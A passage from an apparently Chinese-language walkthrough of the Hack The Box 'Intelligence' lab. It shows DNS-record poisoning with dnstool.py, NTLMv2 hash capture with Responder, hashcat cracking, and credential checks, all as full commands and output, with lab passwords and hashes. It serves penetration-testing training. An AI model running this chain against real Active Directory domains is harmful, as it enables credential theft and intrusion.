class="hljs-number">2021</span><br>  Cookies                         DHSrn        <span class="hljs-number">0</span>  Mon Apr <span class="hljs-number">19</span> <span class="hljs-number">08</span>:<span class="hljs-number">51</span>:<span class="hljs-number">46</span> <span class="hljs-number">2021</span><br>  Desktop                            DR        <span class="hljs-number">0</span>  Mon Apr <span class="hljs-number">19</span> <span class="hljs-number">08</span>:<span class="hljs-number">51</span>:<span class="hljs-number">46</span> <span class="hljs-number">2021</span><br>  Documents                          DR        <span class="hljs-number">0</span>  Mon Apr <span class="hljs-number">19</span> <span class="hljs-number">08</span>:<span class="hljs-number">51</span>:<span class="hljs-number">46</span> <span class="hljs-number">2021</span><br>  Downloads                          DR        <span class="hljs-number">0</span>  Sat Sep <span class="hljs-number">15</span> <span class="hljs-number">15</span>:<span class="hljs-number">12</span>:<span class="hljs-number">33</span> <span class="hljs-number">2018</span><br>  Favorites                          DR        <span class="hljs-number">0</span>  Sat Sep <span class="hljs-number">15</span> <span class="hljs-number">15</span>:<span class="hljs-number">12</span>:<span class="hljs-number">33</span> <span class="hljs-number">2018</span><br>  Links                              DR        <span class="hljs-number">0</span>  Sat Sep <span class="hljs-number">15</span> <span class="hljs-number">15</span>:<span class="hljs-number">12</span>:<span class="hljs-number">33</span> <span class="hljs-number">2018</span><br>  Local Settings                  DHSrn        <span class="hljs-number">0</span>  Mon Apr <span class="hljs-number">19</span> <span class="hljs-number">08</span>:<span class="hljs-number">51</span>:<span class="hljs-number">46</span> <span class="hljs-number">2021</span><br>  Music                              DR        <span class="hljs-number">0</span>  Sat Sep <span class="hljs-number">15</span> <span class="hljs-number">15</span>:<span class="hljs-number">12</span>:<span class="hljs-number">33</span> <span class="hljs-number">2018</span><br>  My Documents                    DHSrn        <span class="hljs-number">0</span>  Mon Apr <span class="hljs-number">19</span> <span class="hljs-number">08</span>:<span class="hljs-number">51</span>:<span class="hljs-number">46</span> <span class="hljs-number">2021</span><br>  NetHood                         DHSrn        <span class="hljs-number">0</span>  Mon Apr <span class="hljs-number">19</span> <span class="hljs-number">08</span>:<span class="hljs-number">51</span>:<span class="hljs-number">46</span> <span class="hljs-number">2021</span><br>  NTUSER.DAT                        AHn   <span class="hljs-number">131072</span>  Tue Apr  <span class="hljs-number">2</span> <span class="hljs-number">04</span>:<span class="hljs-number">48</span>:<span class="hljs-number">57</span> <span class="hljs-number">2024</span><br>  ntuser.dat.LOG1                   AHS    <span class="hljs-number">86016</span>  Mon Apr <span class="hljs-number">19</span> <span class="hljs-number">08</span>:<span class="hljs-number">51</span>:<span class="hljs-number">46</span> <span class="hljs-number">2021</span><br>  ntuser.dat.LOG2                   AHS        <span class="hljs-number">0</span>  Mon Apr <span class="hljs-number">19</span> <span class="hljs-number">08</span>:<span class="hljs-number">51</span>:<span class="hljs-number">46</span> <span class="hljs-number">2021</span><br>  NTUSER.DAT&#123;<span class="hljs-number">6392777f</span>-a0b5<span class="hljs-number">-11</span>eb-ae6e<span class="hljs-number">-000</span>c2908ad93&#125;.TM.blf    AHS    <span class="hljs-number">65536</span>  Mon Apr <span class="hljs-number">19</span> <span class="hljs-number">08</span>:<span class="hljs-number">51</span>:<span class="hljs-number">46</span> <span class="hljs-number">2021</span><br>  NTUSER.DAT&#123;<span class="hljs-number">6392777f</span>-a0b5<span class="hljs-number">-11</span>eb-ae6e<span class="hljs-number">-000</span>c2908ad93&#125;.TMContainer00000000000000000001.regtrans-ms    AHS   <span class="hljs-number">524288</span>  Mon Apr <span class="hljs-number">19</span> <span class="hljs-number">08</span>:<span class="hljs-number">51</span>:<span class="hljs-number">46</span> <span class="hljs-number">2021</span><br>  NTUSER.DAT&#123;<span class="hljs-number">6392777f</span>-a0b5<span class="hljs-number">-11</span>eb-ae6e<span class="hljs-number">-000</span>c2908ad93&#125;.TMContainer00000000000000000002.regtrans-ms    AHS   <span class="hljs-number">524288</span>  Mon Apr <span class="hljs-number">19</span> <span class="hljs-number">08</span>:<span class="hljs-number">51</span>:<span class="hljs-number">46</span> <span class="hljs-number">2021</span><br>  ntuser.ini                        AHS       <span class="hljs-number">20</span>  Mon Apr <span class="hljs-number">19</span> <span class="hljs-number">08</span>:<span class="hljs-number">51</span>:<span class="hljs-number">46</span> <span class="hljs-number">2021</span><br>  Pictures                           DR        <span class="hljs-number">0</span>  Sat Sep <span class="hljs-number">15</span> <span class="hljs-number">15</span>:<span class="hljs-number">12</span>:<span class="hljs-number">33</span> <span class="hljs-number">2018</span><br>  Recent                          DHSrn        <span class="hljs-number">0</span>  Mon Apr <span class="hljs-number">19</span> <span class="hljs-number">08</span>:<span class="hljs-number">51</span>:<span class="hljs-number">46</span> <span class="hljs-number">2021</span><br>  Saved Games                         D        <span class="hljs-number">0</span>  Sat Sep <span class="hljs-number">15</span> <span class="hljs-number">15</span>:<span class="hljs-number">12</span>:<span class="hljs-number">33</span> <span class="hljs-number">2018</span><br>  SendTo                          DHSrn        <span class="hljs-number">0</span>  Mon Apr <span class="hljs-number">19</span> <span class="hljs-number">08</span>:<span class="hljs-number">51</span>:<span class="hljs-number">46</span> <span class="hljs-number">2021</span><br>  Start Menu                      DHSrn        <span class="hljs-number">0</span>  Mon Apr <span class="hljs-number">19</span> <span class="hljs-number">08</span>:<span class="hljs-number">51</span>:<span class="hljs-number">46</span> <span class="hljs-number">2021</span><br>  Templates                       DHSrn        <span class="hljs-number">0</span>  Mon Apr <span class="hljs-number">19</span> <span class="hljs-number">08</span>:<span class="hljs-number">51</span>:<span class="hljs-number">46</span> <span class="hljs-number">2021</span><br>  Videos                             DR        <span class="hljs-number">0</span>  Sat Sep <span class="hljs-number">15</span> <span class="hljs-number">15</span>:<span class="hljs-number">12</span>:<span class="hljs-number">33</span> <span class="hljs-number">2018</span><br><br>                <span class="hljs-number">3770367</span> blocks of size <span class="hljs-number">4096.</span> <span class="hljs-number">1461870</span> blocks available<br>smb: \Tiffany.Molina\&gt; cd Desktop\<br>smb: \Tiffany.Molina\Desktop\&gt; ls<br>  .                                  DR        <span class="hljs-number">0</span>  Mon Apr <span class="hljs-number">19</span> <span class="hljs-number">08</span>:<span class="hljs-number">51</span>:<span class="hljs-number">46</span> <span class="hljs-number">2021</span><br>  ..                                 DR        <span class="hljs-number">0</span>  Mon Apr <span class="hljs-number">19</span> <span class="hljs-number">08</span>:<span class="hljs-number">51</span>:<span class="hljs-number">46</span> <span class="hljs-number">2021</span><br>  user.txt                           AR       <span class="hljs-number">34</span>  Tue Apr  <span class="hljs-number">2</span> <span class="hljs-number">04</span>:<span class="hljs-number">39</span>:<span class="hljs-number">39</span> <span class="hljs-number">2024</span><br><br>                <span class="hljs-number">3770367</span> blocks of size <span class="hljs-number">4096.</span> <span class="hljs-number">1461870</span> blocks available<br>smb: \Tiffany.Molina\Desktop\&gt; get user.txt <br>getting file \Tiffany.Molina\Desktop\user.txt of size <span class="hljs-number">34</span> as user.txt (<span class="hljs-number">0.0</span> KiloBytes/sec) (average <span class="hljs-number">0.0</span> KiloBytes/sec)<br>smb: \Tiffany.Molina\Desktop\&gt;<br></code></pre></td></tr></table></figure>

<p>14、在这里我们发现了第一个flag信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ cat user.txt  <br><span class="hljs-number">60651</span>dd079df97c917365dcbffd853ad<br></code></pre></td></tr></table></figure>

<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>15、其实上面的SMB枚举中，还获取到一个脚本的信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ smbclient \\\\<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span>\\IT  -U Tiffany.Molina%<span class="hljs-string">&#x27;NewIntelligenceCorpUser9876&#x27;</span><br>Try <span class="hljs-string">&quot;help&quot;</span> to get a <span class="hljs-built_in">list</span> of possible commands.<br>smb: \&gt; ls<br>  .                                   D        <span class="hljs-number">0</span>  Mon Apr <span class="hljs-number">19</span> <span class="hljs-number">08</span>:<span class="hljs-number">50</span>:<span class="hljs-number">55</span> <span class="hljs-number">2021</span><br>  ..                                  D        <span class="hljs-number">0</span>  Mon Apr <span class="hljs-number">19</span> <span class="hljs-number">08</span>:<span class="hljs-number">50</span>:<span class="hljs-number">55</span> <span class="hljs-number">2021</span><br>  downdetector.ps1                    A     <span class="hljs-number">1046</span>  Mon Apr <span class="hljs-number">19</span> <span class="hljs-number">08</span>:<span class="hljs-number">50</span>:<span class="hljs-number">55</span> <span class="hljs-number">2021</span><br><br>                <span class="hljs-number">3770367</span> blocks of size <span class="hljs-number">4096.</span> <span class="hljs-number">1461870</span> blocks available<br>smb: \&gt; get downdetector.ps1 <br>getting file \downdetector.ps1 of size <span class="hljs-number">1046</span> as downdetector.ps1 (<span class="hljs-number">0.6</span> KiloBytes/sec) (average <span class="hljs-number">0.6</span> KiloBytes/sec)<br>smb: \&gt; <span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure>

<p><img src="http://sh1yan.top/photo/Intelligence-htb-writeup/9.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ cat downdetector.ps1 <br>��# Check web server status. Scheduled to run every <span class="hljs-number">5</span>min<br>Import-Module ActiveDirectory <br><span class="hljs-title function_">foreach</span><span class="hljs-params">($record in Get-ChildItem <span class="hljs-string">&quot;AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb&quot;</span> | Where-Object Name -like <span class="hljs-string">&quot;web*&quot;</span>)</span>  &#123;<br>try &#123;<br>$request = Invoke-WebRequest -Uri <span class="hljs-string">&quot;http://$($record.Name)&quot;</span> -UseDefaultCredentials<br><span class="hljs-keyword">if</span>(.StatusCode -ne <span class="hljs-number">200</span>) &#123;<br>Send-MailMessage -From <span class="hljs-string">&#x27;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#x27;</span> -To <span class="hljs-string">&#x27;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#x27;</span> -Subject <span class="hljs-string">&quot;Host: $($record.Name) is down&quot;</span><br>&#125;<br>&#125; catch &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>该脚本进入 LDAP 并获 取所有计算机的列表，然后循环访问名称以“web”开头的计算机。它将尝试向该服务器发出 Web 请求（使用正在运行的用户的凭据），如果状态代码不是 200，它将向 Ted.Graves 发送电子邮件，让他们知道主机已关闭。顶部的评论说它计划每五分钟运行一次。</code></p>
<p>16、到这里可以联想到NTLMv2攻击（获取密码），下面使用Krbrelayx工具集里的dnstool.py工具进行尝试</p>
<p><code>dnstool.py是Krbrelayx附带的一个脚本，它可以：</code></p>
<p><code>https://github.com/dirkjanm/krbrelayx</code></p>
<p><code>通过 LDAP 添加/修改/删除 Active Directory 集成 DNS 记录。</code></p>
<p><code>值得一试，看看 Tiffany.Molina 是否有权通过使用以下选项运行来进行此类更改：</code></p>
<p><code>-u intelligence\\Tiffany.Molina- 进行身份验证的用户；</code><br><code>-p NewIntelligenceCorpUser9876- 用户的密码；</code><br><code>--action add- 添加新记录；</code><br><code>--record web-0xdf- 要添加的域；</code><br><code>--data 10.01.14.19- 要添加的数据，在本例中为解析 web-0xdf 的 IP；</code><br><code>--type A- 要添加的记录类型。</code></p>
<p>17、下面开始架设和利用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ nc -lvnp <span class="hljs-number">80</span><br>listening on [any] <span class="hljs-number">80</span> ...<br>connect to [<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.11</span>] from (UNKNOWN) [<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span>] <span class="hljs-number">50065</span><br>GET / HTTP/<span class="hljs-number">1.1</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT; Windows NT <span class="hljs-number">10.0</span>; en-US) WindowsPowerShell/<span class="hljs-number">5.1</span><span class="hljs-number">.17763</span><span class="hljs-number">.1852</span><br>Host: web1<br>Connection: Keep-Alive<br><br>┌──(kali㉿offsec)-[~/Desktop/tools/krbrelayx]<br>└─$ python3 dnstool.py -u <span class="hljs-string">&#x27;intelligence\Tiffany.Molina&#x27;</span> -p NewIntelligenceCorpUser9876 <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span> -a add -r web-shiyan -d <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.11</span> -t A --allow-multiple<br>[-] Connecting to host...<br>[-] Binding to host<br>[+] Bind OK<br>[-] Adding extra record<br>[+] LDAP operation completed successfully<br><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo responder -I tun0 -w -d <br>[sudo] kali 的密码：<br>                                         __<br>  .----.-----.-----.-----.-----.-----.--|  |.-----.----.<br>  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|<br>  |__| |_____|_____|   __|_____|__|__|_____||_____|__|<br>                   |__|<br><br>           NBT-NS, LLMNR &amp; MDNS Responder <span class="hljs-number">3.1</span><span class="hljs-number">.4</span><span class="hljs-number">.0</span><br><br>  To support this project:<br>  Github -&gt; https:<span class="hljs-comment">//github.com/sponsors/lgandx</span><br>  Paypal  -&gt; https:<span class="hljs-comment">//paypal.me/PythonResponder</span><br><br>  Author: Laurent <span class="hljs-title function_">Gaffie</span> <span class="hljs-params">(laurent.gaffie@gmail.com)</span><br>  To kill this script hit CTRL-C<br><br><br>[+] Poisoners:<br>    LLMNR                      [ON]<br>    NBT-NS                     [ON]<br>    MDNS                       [ON]<br>    DNS                        [ON]<br>    DHCP                       [ON]<br><br>[+] Servers:<br>    HTTP server                [ON]<br>    HTTPS server               [ON]<br>    WPAD proxy                 [ON]<br>    Auth proxy                 [OFF]<br>    SMB server                 [ON]<br>    Kerberos server            [ON]<br>    SQL server                 [ON]<br>    FTP server                 [ON]<br>    IMAP server                [ON]<br>    POP3 server                [ON]<br>    SMTP server                [ON]<br>    DNS server                 [ON]<br>    LDAP server                [ON]<br>    MQTT server                [ON]<br>    RDP server                 [ON]<br>    DCE-RPC server             [ON]<br>    WinRM server               [ON]<br>    SNMP server                [OFF]<br><br>[+] HTTP Options:<br>    Always serving EXE         [OFF]<br>    Serving EXE                [OFF]<br>    Serving HTML               [OFF]<br>    Upstream Proxy             [OFF]<br><br>[+] Poisoning Options:<br>    Analyze Mode               [OFF]<br>    Force WPAD auth            [OFF]<br>    Force Basic Auth           [OFF]<br>    Force LM downgrade         [OFF]<br>    Force ESS downgrade        [OFF]<br><br>[+] Generic Options:<br>    Responder NIC              [tun0]<br>    Responder IP               [10.10.14.11]<br>    Responder IPv6             [dead:beef:2::1009]<br>    Challenge <span class="hljs-built_in">set</span>              [random]<br>    Don&#x27;t Respond To Names     [&#x27;ISATAP&#x27;, &#x27;ISATAP.LOCAL&#x27;]<br><br>[+] Current Session Variables:<br>    Responder Machine Name     [WIN-FS1RHMHFQ6J]<br>    Responder Domain Name      [JAHG.LOCAL]<br>    Responder DCE-RPC Port     [47998]<br><br>[+] Listening <span class="hljs-keyword">for</span> events...                                                                                                                                <br><br>[HTTP] NTLMv2 Client   : 10.10.10.248<br>[HTTP] NTLMv2 Username : intelligence\Ted.Graves<br>[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:55d715a0f1b61eca:F1339196011CD69F875E8E722DA39D19:0101000000000000163AB6657E84DA01DF6CCD119A4C9F5B00000000020008004A0041004800470001001E00570049004E002D00460053003100520048004D0048004600510036004A00040014004A004100480047002E004C004F00430041004C0003003400570049004E002D00460053003100520048004D0048004600510036004A002E004A004100480047002E004C004F00430041004C00050014004A004100480047002E004C004F00430041004C00080030003000000000000000000000000020000042953171FBEFDE40C17FFC1A59EE6BBD28BDA280BDCCEB581936E5420526A2E70A001000000000000000000000000000000000000900400048005400540050002F007700650062002D00730068006900790061006E002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000                       <br>[*] Skipping previously captured hash <span class="hljs-keyword">for</span> intelligence\Ted.Graves<br></code></pre></td></tr></table></figure>

<p>18、这里成功的获取到了HTLMv2攻击（密码获取）的结果，下面对获取到的密码进行破解</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ hashcat -h | grep -i <span class="hljs-string">&quot;NTLMv2&quot;</span>                                   <br>   <span class="hljs-number">5600</span> | NetNTLMv2                                                  | Network Protocol<br>  <span class="hljs-number">27100</span> | NetNTLMv2 (NT)                                             | Network Protocol<br>                                                                                                                                                           <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ cat hash            <br>Ted.Graves::intelligence:<span class="hljs-number">55</span>d715a0f1b61eca:F1339196011CD69F875E8E722DA39D19:<span class="hljs-number">0101000000000000163</span>AB6657E84DA01DF6CCD119A4C9F5B00000000020008004A0041004800470001001E00570049004E002D00460053003100520048004D0048004600510036004A00040014004A004100480047002E004C004F00430041004C0003003400570049004E002D00460053003100520048004D0048004600510036004A002E004A004100480047002E004C004F00430041004C00050014004A004100480047002E004C004F00430041004C00080030003000000000000000000000000020000042953171FBEFDE40C17FFC1A59EE6BBD28BDA280BDCCEB581936E5420526A2E70A001000000000000000000000000000000000000900400048005400540050002F007700650062002D00730068006900790061006E002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000<br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo hashcat -m <span class="hljs-number">5600</span> hash  /usr/share/wordlists/rockyou.txt<br><span class="hljs-title function_">hashcat</span> <span class="hljs-params">(v6<span class="hljs-number">.2</span><span class="hljs-number">.6</span>)</span> starting<br><br>OpenCL <span class="hljs-title function_">API</span> <span class="hljs-params">(OpenCL <span class="hljs-number">3.0</span> PoCL <span class="hljs-number">5.0</span>+debian  Linux, None+Asserts, RELOC, SPIR, LLVM <span class="hljs-number">15.0</span><span class="hljs-number">.7</span>, SLEEF, POCL_DEBUG)</span> - Platform #1 [The pocl project]<br>==========================================================================================================================================<br>* Device #<span class="hljs-number">1</span>: cpu-<span class="hljs-number">-0x000</span>, <span class="hljs-number">1439</span>/<span class="hljs-number">2942</span> MB (<span class="hljs-number">512</span> MB allocatable), <span class="hljs-number">4</span>MCU<br><br>Minimum password length supported by kernel: <span class="hljs-number">0</span><br>Maximum password length supported by kernel: <span class="hljs-number">256</span><br><br>Hashes: <span class="hljs-number">1</span> digests; <span class="hljs-number">1</span> unique digests, <span class="hljs-number">1</span> unique salts<br>Bitmaps: <span class="hljs-number">16</span> bits, <span class="hljs-number">65536</span> entries, <span class="hljs-number">0x0000ffff</span> mask, <span class="hljs-number">262144</span> bytes, <span class="hljs-number">5</span>/<span class="hljs-number">13</span> rotates<br>Rules: <span class="hljs-number">1</span><br><br>Optimizers applied:<br>* Zero-Byte<br>* Not-Iterated<br>* Single-Hash<br>* Single-Salt<br><br>ATTENTION! Pure (unoptimized) backend kernels selected.<br>Pure kernels can crack longer passwords, but drastically reduce performance.<br>If you want to <span class="hljs-keyword">switch</span> to optimized kernels, append -O to your commandline.<br>See the above message to find out about the exact limits.<br><br>Watchdog: Temperature <span class="hljs-built_in">abort</span> trigger <span class="hljs-built_in">set</span> to <span class="hljs-number">90</span>c<br><br>Host memory required <span class="hljs-keyword">for</span> this attack: <span class="hljs-number">0</span> MB<br><br>Dictionary cache hit:<br>* Filename..: /usr/share/wordlists/rockyou.txt<br>* Passwords.: <span class="hljs-number">14344385</span><br>* Bytes.....: <span class="hljs-number">139921507</span><br>* Keyspace..: <span class="hljs-number">14344385</span><br><br>Cracking performance lower than expected?                 <br><br>* Append -O to the commandline.<br>  This lowers the maximum supported password/salt <span class="hljs-title function_">length</span> <span class="hljs-params">(usually down to <span class="hljs-number">32</span>)</span>.<br><br>* Append -w 3 to the commandline.<br>  This can cause your screen to lag.<br><br>* Append -S to the commandline.<br>  This has a drastic speed impact but can be better <span class="hljs-keyword">for</span> specific attacks.<br>  Typical scenarios are a small wordlist but a large ruleset.<br><br>* Update your backend API runtime / driver the right way:<br>  https:<span class="hljs-comment">//hashcat.net/faq/wrongdriver</span><br><br>* Create more work items to make use of your parallelization power:<br>  https:<span class="hljs-comment">//hashcat.net/faq/morework</span><br><br>TED.GRAVES::intelligence:55d715a0f1b61eca:f1339196011cd69f875e8e722da39d19:0101000000000000163ab6657e84da01df6ccd119a4c9f5b00000000020008004a0041004800470001001e00570049004e002d00460053003100520048004d0048004600510036004a00040014004a004100480047002e004c004f00430041004c0003003400570049004e002d00460053003100520048004d0048004600510036004a002e004a004100480047002e004c004f00430041004c00050014004a004100480047002e004c004f00430041004c00080030003000000000000000000000000020000042953171fbefde40c17ffc1a59ee6bbd28bda280bdcceb581936e5420526a2e70a001000000000000000000000000000000000000900400048005400540050002f007700650062002d00730068006900790061006e002e0069006e00740065006c006c006900670065006e00630065002e006800740062000000000000000000:Mr.Teddy<br>                                                          <br>Session..........: hashcat<br>Status...........: Cracked<br>Hash.Mode........: 5600 <span class="hljs-params">(NetNTLMv2)</span><br>Hash.Target......: TED.GRAVES::intelligence:55d715a0f1b61eca:f13391960...000000<br>Time.Started.....: Mon Apr  1 22:51:54 2024 <span class="hljs-params">(<span class="hljs-number">8</span> secs)</span><br>Time.Estimated...: Mon Apr  1 22:52:02 2024 <span class="hljs-params">(<span class="hljs-number">0</span> secs)</span><br>Kernel.Feature...: Pure Kernel<br>Guess.Base.......: <span class="hljs-title function_">File</span> <span class="hljs-params">(/usr/share/wordlists/rockyou.txt)</span><br>Guess.Queue......: 1/1 <span class="hljs-params">(<span class="hljs-number">100.00</span>%)</span><br>Speed.#1.........:  1433.4 kH/<span class="hljs-title function_">s</span> <span class="hljs-params">(<span class="hljs-number">0.57</span>ms)</span> @ Accel:256 Loops:1 Thr:1 Vec:4<br>Recovered........: 1/1 <span class="hljs-params">(<span class="hljs-number">100.00</span>%)</span> <span class="hljs-title function_">Digests</span> <span class="hljs-params">(total)</span>, 1/1 <span class="hljs-params">(<span class="hljs-number">100.00</span>%)</span> <span class="hljs-title function_">Digests</span> <span class="hljs-params">(new)</span><br>Progress.........: 10814464/14344385 <span class="hljs-params">(<span class="hljs-number">75.39</span>%)</span><br>Rejected.........: 0/10814464 <span class="hljs-params">(<span class="hljs-number">0.00</span>%)</span><br>Restore.Point....: 10813440/14344385 <span class="hljs-params">(<span class="hljs-number">75.38</span>%)</span><br>Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1<br>Candidate.Engine.: Device Generator<br>Candidates.#1....: Ms.Jordan -&gt; Mr.Brownstone<br>Hardware.Mon.#1..: Util: 84%<br><br>Started: Mon Apr  1 22:51:42 2024<br>Stopped: Mon Apr  1 22:52:03 2024<br></code></pre></td></tr></table></figure>

<p>19、验证该账号密码是否正确</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ crackmapexec smb <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span> -u TED.GRAVES -p Mr.Teddy                                      <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span>    <span class="hljs-number">445</span>    DC               [*] Windows <span class="hljs-number">10.0</span> Build <span class="hljs-number">17763</span> x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)<br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span>    <span class="hljs-number">445</span>    DC               [+] intelligence.htb\TED.GRAVES:Mr.Teddy <br></code></pre></td></tr></table></figure>

<p>20、由于是域环境，想登录到域控主机上，还是有些难度的，但是通过获取的账号信息，进行信息枚举还是可以的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ bloodhound-python -ns <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.248</span> -d intelligence.htb -dc dc.intelligence.htb -u Ted.Graves -p Mr.Teddy<br>INFO: Found AD domain: intelligence.htb<br>INFO: Getting TGT <span class="hljs-keyword">for</span> user<br>WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)<br>INFO: 